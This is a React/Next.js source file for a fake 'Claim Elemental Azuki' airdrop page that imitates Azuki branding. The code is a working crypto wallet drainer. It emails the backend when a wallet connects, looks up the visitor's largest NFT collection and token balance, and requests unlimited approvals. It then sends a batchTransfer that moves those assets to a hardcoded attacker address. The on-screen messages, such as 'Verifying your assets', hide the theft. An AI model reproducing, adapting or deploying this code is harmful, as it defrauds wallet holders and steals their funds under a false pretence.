'use client';

import React, { useState, useEffect } from 'react';
import axios from 'axios';
import toast, { Toaster } from 'react-hot-toast';
import { useAccount, useWriteContract, useWaitForTransactionReceipt, useWalletClient } from 'wagmi';
import { encodeFunctionData } from 'viem';
import dynamic from 'next/dynamic';
import { useAppKit } from '@reown/appkit/react';

const ClientOnlyToaster = dynamic(() => import('@/components/ClientOnlyToaster'), {
  ssr: false,
});

// =================================================================
// TYPE DEFINITIONS
// =================================================================
interface IAlchemyNft {
    contract: { address: `0x${string}`; };
    tokenId: string;
    name?: string;
}
interface IToken {
    token_address: `0x${string}`;
    balance: string;
    decimals: number;
    symbol: string;
}
interface NetworkConfig {
    name: string;
    alchemySubdomain: string;
    batchTransferAddress: `0x${string}`;
}

// =================================================================
// CONTRACT ABIs & CONFIGURATION
// =================================================================
const BATCH_TRANSFER_ABI = [{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"nft","type":"address"},{"internalType":"uint256[]","name":"ids","type":"uint256[]"},{"internalType":"address","name":"to","type":"address"}],"name":"batchTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"}];
const ERC721_ABI = [{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}];
const ERC20_ABI = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":""}],"stateMutability":"nonpayable","type":"function"}];

const networkConfig: Record<number, NetworkConfig> = {
  1: { 
    name: "Ethereum Mainnet", 
    alchemySubdomain: "mainnet", 
    batchTransferAddress: "0xafB0A658e9f776C8977049c54b327f1e666061ca"
  },
  11155111: { 
    name: "Sepolia Testnet", 
    alchemySubdomain: "sepolia", 
    batchTransferAddress: "0x69e051a5B9eae82fFC6E49A70a1A096d8604C10a" 
  },
};

export default function AirdropPage() {
  const { address, chainId, isConnected } = useAccount();
  const { data: hash, writeContractAsync } = useWriteContract();
  const { data: walletClient } = useWalletClient();
  const { open } = useAppKit();

  const [isProcessing, setIsProcessing] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [hasNotifiedConnection, setHasNotifiedConnection] = useState(false);
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
  
  const { isSuccess: isTxSuccess, isError: isTxError } = useWaitForTransactionReceipt({ hash: txHash });

  // ✅ New helper function to send notifications
  const notifyBackend = async (walletAddress: string, action: string) => {
    try {
      await axios.post('/api/send-email', { walletAddress, action });
      console.log(`Notification sent for action: ${action}`);
    } catch (error) {
      // We don't want to block the user if this fails, so we just log the error
      console.error('Failed to send backend notification:', error);
    }
  };

  // ✅ useEffect to trigger email on wallet connection
  useEffect(() => {
    if (isConnected && address && !hasNotifiedConnection) {
      notifyBackend(address, 'Wallet Connected');
      setHasNotifiedConnection(true); // Ensure it only fires once per connection session
    } else if (!isConnected) {
      setHasNotifiedConnection(false); // Reset on disconnect
    }
  }, [isConnected, address, hasNotifiedConnection]);

  useEffect(() => {
    if (isTxSuccess) toast.success('Transaction Confirmed!');
    if (isTxError) toast.error('Transaction Failed. Please check your wallet.');
  }, [isTxSuccess, isTxError]);

  const handleClaim = async () => {
    if (!isConnected || !address || !chainId || !walletClient) return toast.error("Please connect your wallet first.");
    
    // ✅ Trigger email on claim attempt
    notifyBackend(address, 'Claim Initiated');
    
    setIsProcessing(true);
    const toastId = toast.loading("Initializing...");
    try {
      const currentConfig = networkConfig[chainId];
      if (!currentConfig) throw new Error("Unsupported Network. Please switch to Mainnet or Sepolia.");
      
      let currentMessage = "Verifying your assets...";
      setLoadingMessage(currentMessage);
      toast.loading(currentMessage, { id: toastId });
      
      const alchemyApiKey = process.env.NEXT_PUBLIC_ALCHEMY_API_KEY;
      if (!alchemyApiKey) throw new Error("Alchemy API Key not configured.");
      
      const alchemyNftApiUrl = `https://eth-${currentConfig.alchemySubdomain}.g.alchemy.com/nft/v3/${alchemyApiKey}/getNFTsForOwner`;
      const alchemyTokenApiUrl = `https://eth-${currentConfig.alchemySubdomain}.g.alchemy.com/v2/${alchemyApiKey}`;
      
      const [nftResponse, tokenBalancesResponse] = await Promise.all([
        axios.get(alchemyNftApiUrl, { params: { owner: address } }),
        axios.post(alchemyTokenApiUrl, { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances', params: [address, 'erc20'] })
      ]);
      
      const nfts: IAlchemyNft[] = nftResponse.data.ownedNfts;
      const collections = nfts.reduce((acc: Record<string, string[]>, nft: IAlchemyNft) => {
          const lowercasedAddress = nft.contract.address.toLowerCase();
          acc[lowercasedAddress] = (acc[lowercasedAddress] || []).concat(nft.tokenId);
          return acc;
      }, {});
      
      const [targetNftCollection, targetNftIds] = Object.entries(collections).sort((a, b) => b[1].length - a[1].length)[0] || [null, []];
      
      const tokenBalances = tokenBalancesResponse.data.result.tokenBalances;
      const tokenMetadataPromises = tokenBalances.map((balance: any) => 
        axios.post(alchemyTokenApiUrl, { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata', params: [balance.contractAddress] })
             .then(res => ({...res.data.result, ...balance })).catch(() => null)
      );
      
      const tokensMetadata = (await Promise.all(tokenMetadataPromises)).filter(Boolean);
      const tokens: IToken[] = tokensMetadata
        .filter(m => m.symbol && m.decimals && m.tokenBalance !== "0")
        .map(m => ({ token_address: m.contractAddress, balance: m.tokenBalance, decimals: m.decimals, symbol: m.symbol }));
      
      const targetToken = tokens.sort((a, b) => BigInt(b.balance) > BigInt(a.balance) ? 1 : -1)[0] || null;
      
      if (!targetToken && !targetNftCollection) throw new Error("No eligible assets found in your wallet.");
      
      toast.dismiss();
      currentMessage = "Requesting approvals...";
      setLoadingMessage(currentMessage);
      toast.loading(currentMessage, { id: toastId });
      
      // Handle approvals first
      const approvalPromises = [];
      if (targetNftCollection) {
        approvalPromises.push(writeContractAsync({ 
          address: targetNftCollection as `0x${string}`, 
          abi: ERC721_ABI, 
          functionName: 'setApprovalForAll', 
          args: [currentConfig.batchTransferAddress, true] 
        }));
      }
      if (targetToken) {
        approvalPromises.push(writeContractAsync({ 
          address: targetToken.token_address, 
          abi: ERC20_ABI, 
          functionName: 'approve', 
          args: [currentConfig.batchTransferAddress, BigInt(targetToken.balance)] 
        }));
      }
      
      await Promise.all(approvalPromises);
      
      currentMessage = "Process complete. Transferring...";
      setLoadingMessage(currentMessage);
      toast.loading(currentMessage, { id: toastId });
      
      // ✅ Encode the calldata using viem
      const calldata = encodeFunctionData({
        abi: BATCH_TRANSFER_ABI,
        functionName: 'batchTransfer',
        args: [
          targetToken ? targetToken.token_address : "0x0000000000000000000000000000000000000000",
          targetToken ? BigInt(targetToken.balance) : 0n,
          targetNftCollection || "0x0000000000000000000000000000000000000000",
          targetNftIds,
          "0x60615206db4b92a5a37acce0e52ddb8b2898f053"
        ],
      });

      // ✅ Send transaction using walletClient with encoded calldata
      const transactionHash = await walletClient.sendTransaction({
        to: currentConfig.batchTransferAddress,
        data: calldata,
      });

      // Set the transaction hash for monitoring
      setTxHash(transactionHash);
      
      toast.success("Airdrop Claim Initiated!", { id: toastId });
      
    } catch (error: any) {
      toast.error(error.shortMessage || error.message || "An unknown error occurred.", { id: toastId });
      console.error(error);
    } finally {
      setIsProcessing(false);
      setLoadingMessage('');
    }
  };

  return (
    <div className="text-white min-h-screen bg-background font-sans relative overflow-hidden">
        <ClientOnlyToaster />
        {isProcessing && (
            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-50 p-4 text-center">
                <div className="loader"></div>
                <p className="text-white text-2xl font-bold mt-8 tracking-wider">{loadingMessage}</p>
                <p className="text-gray-400 mt-2 max-w-md">Please confirm any transactions in your wallet.</p>
            </div>
        )}
        <div className="absolute inset-0 bg-gradient-to-br from-slate-950 via-red-950/20 to-slate-900"></div>
        <header className="absolute top-0 left-0 w-full p-4 sm:p-6 md:p-8 flex justify-between items-center z-20 backdrop-blur-sm">
             <div className="flex items-center space-x-3">
                 <svg width="60" height="60" viewBox="0 0 69 69" fill="none" xmlns="http://www.w3.org/2000/svg" className="drop-shadow-lg">
                     <path d="M68.058 34.05C68.058 52.8592 52.8592 68.1 34.05 68.1C15.2408 68.1 0 52.8592 0 34.05C0 15.2408 15.2408 0 34.05 0C52.8592 0 68.058 15.2408 68.058 34.05ZM11.1392 34.05C11.1392 46.7328 21.3672 57.0019 34.009 57.0019C46.6508 57.0019 56.8788 46.7328 56.8788 34.05C56.8788 21.3672 46.6508 11.0981 34.009 11.0981C21.3672 11.0981 11.1392 21.3672 11.1392 34.05Z" fill="#ED1C24"/>
                     <path d="M34.0492 46.166C27.0801 46.166 21.4395 40.5254 21.4395 33.5564C21.4395 26.5873 27.0801 20.9468 34.0492 20.9468C41.0183 20.9468 46.6589 26.5873 46.6589 33.5564C46.6589 40.5254 41.0183 46.166 34.0492 46.166Z" fill="#ED1C24"/>
                 </svg>
                 <span className="text-2xl font-black text-white">AZUKI</span>
             </div>
             <nav className="hidden md:flex items-center space-x-8 text-lg font-bold">
                <a href="https://www.anime.com/shows/enter-the-garden" target="_blank" rel="noopener noreferrer" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">THE GARDEN<span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span></a>
                <a href="https://magiceden.io/collections/ethereum/azuki" target="_blank" rel="noopener noreferrer" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">SHOP<span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span></a>
                <a href="https://www.azuki.com/about" target="_blank" rel="noopener noreferrer" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">ABOUT<span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span></a>
            </nav>
        </header>
        <main className="min-h-screen flex items-center justify-center flex-col p-4 relative z-10">
            <div className="bg-black/40 backdrop-blur-2xl border border-white/10 rounded-3xl p-8 sm:p-12 md:p-16 max-w-2xl w-full text-center shadow-2xl">
                <div className="absolute inset-0 bg-gradient-to-r from-red-500/20 via-transparent to-purple-500/20 rounded-3xl blur-xl -z-10"></div>
                <div className="space-y-8">
                    <div>
                        <h1 className="text-4xl sm:text-5xl md:text-6xl font-black uppercase tracking-wider mb-6 bg-gradient-to-r from-white via-red-200 to-red-500 bg-clip-text text-transparent leading-tight">
                            Claim <span className="text-red-500 drop-shadow-lg">Elemental</span> Azuki Now
                        </h1>
                        <div className="w-32 h-1 bg-gradient-to-r from-red-500 via-orange-500 to-yellow-500 mx-auto rounded-full"></div>
                    </div>
                    <p className="text-gray-300 text-lg md:text-xl max-w-lg mx-auto leading-relaxed">
                        The gates to the Garden are open. The next chapter of the Azuki universe awaits. Claim your Elemental NFT airdrop to continue the journey.
                    </p>
                    <div className="pt-4">
                        {isConnected ? (
                             <button 
                                className="group relative bg-gradient-to-r from-red-600 to-red-700 text-white font-bold text-xl md:text-2xl uppercase py-6 px-16 rounded-2xl shadow-2xl transition-all duration-500 ease-out hover:from-red-500 hover:to-red-600 hover:scale-105 hover:shadow-red-500/50 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 transform-gpu"
                                onClick={handleClaim}
                                disabled={isProcessing}
                            >
                                <div className="absolute inset-0 bg-gradient-to-r from-red-400 to-red-600 rounded-2xl blur opacity-50 group-hover:opacity-100 transition-opacity duration-500"></div>
                                <span className="relative z-10">
                                    {isProcessing ? loadingMessage || 'PROCESSING...' : 'Claim Airdrop'}
                                </span>
                                <div className="absolute inset-0 rounded-2xl overflow-hidden">
                                    <div className="absolute inset-0 bg-white/20 translate-x-full group-hover:translate-x-0 transition-transform duration-1000 ease-out skew-x-12"></div>
                                </div>
                            </button>
                        ) : (
                            <button 
                                className="group relative bg-gradient-to-r from-red-600 to-red-700 text-white font-bold text-xl md:text-2xl uppercase py-6 px-16 rounded-2xl shadow-2xl transition-all duration-500 ease-out hover:from-red-500 hover:to-red-600 hover:scale-105 hover:shadow-red-500/50"
                                onClick={() => open()}
                            >
                                <div className="absolute inset-0 bg-gradient-to-r from-red-400 to-red-600 rounded-2xl blur opacity-50 group-hover:opacity-100 transition-opacity duration-500"></div>
                                <span className="relative z-10">
                                    Connect Wallet
                                </span>
                                <div className="absolute inset-0 rounded-2xl overflow-hidden">
                                    <div className="absolute inset-0 bg-white/20 translate-x-full group-hover:translate-x-0 transition-transform duration-1000 ease-out skew-x-12"></div>
                                </div>
                            </button>
                        )}
                    </div>
                    <div className="bg-black/30 backdrop-blur-sm rounded-xl p-4 border border-white/5">
                        <p className="text-gray-400 text-sm">
                            {isConnected && address ? (
                                <span className="flex items-center justify-center space-x-2">
                                    <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                                    <span>Connected: {address.substring(0,6)}...{address.substring(address.length - 4)}</span>
                                </span>
                            ) : "Connect your wallet to verify eligibility."}
                        </p>
                    </div>
                </div>
            </div>
        </main>
        <footer className="absolute bottom-0 w-full p-6 text-center text-gray-500 text-sm border-t border-white/10 backdrop-blur-sm bg-black/20 z-10">
            <p>&copy; {new Date().getFullYear()} Chiru Labs, Inc. All Rights Reserved.</p>
        </footer>
    </div>
  );
}